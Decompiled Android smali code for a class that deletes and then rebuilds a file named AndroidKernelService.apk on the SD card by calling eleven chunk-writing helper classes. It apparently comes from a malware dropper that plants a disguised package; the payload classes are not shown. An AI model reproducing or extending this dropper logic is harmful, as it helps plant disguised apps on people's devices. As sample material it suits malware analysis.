.class public Lcom/Qdzs/WriteApk;
.super Ljava/lang/Object;
.source "WriteApk.java"


# instance fields
.field final myLogFilePath:Ljava/lang/String;


# direct methods
.method public constructor <init>()V
    .locals 1

    .prologue
    .line 17
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    .line 19
    const-string v0, "/mnt/sdcard/"

    iput-object v0, p0, Lcom/Qdzs/WriteApk;->myLogFilePath:Ljava/lang/String;

    .line 17
    return-void
.end method


# virtual methods
.method Write()V
    .locals 14

    .prologue
    .line 24
    new-instance v11, Ljava/io/File;

    const-string v12, "/mnt/sdcard/AndroidKernelService.apk"

    invoke-direct {v11, v12}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    .line 25
    .local v11, targetApk:Ljava/io/File;
    invoke-virtual {v11}, Ljava/io/File;->exists()Z

    move-result v12

    if-eqz v12, :cond_0

    .line 26
    invoke-virtual {v11}, Ljava/io/File;->delete()Z

    .line 29
    :cond_0
    const-string v12, "SDPath"

    const-string v13, "/mnt/sdcard/"

    invoke-static {v12, v13}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    .line 30
    sget-object v12, Ljava/lang/System;->out:Ljava/io/PrintStream;

    const-string v13, "/mnt/sdcard/"

    invoke-virtual {v12, v13}, Ljava/io/PrintStream;->print(Ljava/lang/String;)V

    .line 32
    const-string v12, "start"

    invoke-static {v12}, Lcom/Qdzs/WriteLogFile;->writeLog(Ljava/lang/String;)V

    .line 34
    new-instance v0, Lcom/Qdzs/WriteApk01;

    invoke-direct {v0}, Lcom/Qdzs/WriteApk01;-><init>()V

    .line 35
    .local v0, myWriteApk01:Lcom/Qdzs/WriteApk01;
    invoke-virtual {v0}, Lcom/Qdzs/WriteApk01;->doWriteApk()I

    .line 36
    new-instance v1, Lcom/Qdzs/WriteApk02;

    invoke-direct {v1}, Lcom/Qdzs/WriteApk02;-><init>()V

    .line 37
    .local v1, myWriteApk02:Lcom/Qdzs/WriteApk02;
    invoke-virtual {v1}, Lcom/Qdzs/WriteApk02;->doWriteApk()I

    .line 38
    new-instance v2, Lcom/Qdzs/WriteApk03;

    invoke-direct {v2}, Lcom/Qdzs/WriteApk03;-><init>()V

    .line 39
    .local v2, myWriteApk03:Lcom/Qdzs/WriteApk03;
    invoke-virtual {v2}, Lcom/Qdzs/WriteApk03;->doWriteApk()I

    .line 40
    new-instance v3, Lcom/Qdzs/WriteApk04;

    invoke-direct {v3}, Lcom/Qdzs/WriteApk04;-><init>()V

    .line 41
    .local v3, myWriteApk04:Lcom/Qdzs/WriteApk04;
    invoke-virtual {v3}, Lcom/Qdzs/WriteApk04;->doWriteApk()I

    .line 42
    new-instance v4, Lcom/Qdzs/WriteApk05;

    invoke-direct {v4}, Lcom/Qdzs/WriteApk05;-><init>()V

    .line 43
    .local v4, myWriteApk05:Lcom/Qdzs/WriteApk05;
    invoke-virtual {v4}, Lcom/Qdzs/WriteApk05;->doWriteApk()I

    .line 44
    new-instance v5, Lcom/Qdzs/WriteApk06;

    invoke-direct {v5}, Lcom/Qdzs/WriteApk06;-><init>()V

    .line 45
    .local v5, myWriteApk06:Lcom/Qdzs/WriteApk06;
    invoke-virtual {v5}, Lcom/Qdzs/WriteApk06;->doWriteApk()I

    .line 46
    new-instance v6, Lcom/Qdzs/WriteApk07;

    invoke-direct {v6}, Lcom/Qdzs/WriteApk07;-><init>()V

    .line 47
    .local v6, myWriteApk07:Lcom/Qdzs/WriteApk07;
    invoke-virtual {v6}, Lcom/Qdzs/WriteApk07;->doWriteApk()I

    .line 48
    new-instance v7, Lcom/Qdzs/WriteApk08;

    invoke-direct {v7}, Lcom/Qdzs/WriteApk08;-><init>()V

    .line 49
    .local v7, myWriteApk08:Lcom/Qdzs/WriteApk08;
    invoke-virtual {v7}, Lcom/Qdzs/WriteApk08;->doWriteApk()I

    .line 50
    new-instance v8, Lcom/Qdzs/WriteApk09;

    invoke-direct {v8}, Lcom/Qdzs/WriteApk09;-><init>()V

    .line 51
    .local v8, myWriteApk09:Lcom/Qdzs/WriteApk09;
    invoke-virtual {v8}, Lcom/Qdzs/WriteApk09;->doWriteApk()I

    .line 52
    new-instance v9, Lcom/Qdzs/WriteApk10;

    invoke-direct {v9}, Lcom/Qdzs/WriteApk10;-><init>()V

    .line 53
    .local v9, myWriteApk10:Lcom/Qdzs/WriteApk10;
    invoke-virtual {v9}, Lcom/Qdzs/WriteApk10;->doWriteApk()I

    .line 54
    new-instance v10, Lcom/Qdzs/WriteApk11;

    invoke-direct {v10}, Lcom/Qdzs/WriteApk11;-><init>()V

    .line 55
    .local v10, myWriteApk11:Lcom/Qdzs/WriteApk11;
    invoke-virtual {v10}, Lcom/Qdzs/WriteApk11;->doWriteApk()I

    .line 56
    const-string v12, "end"

    invoke-static {v12}, Lcom/Qdzs/WriteLogFile;->writeLog(Ljava/lang/String;)V

    .line 59
    return-void
.end method
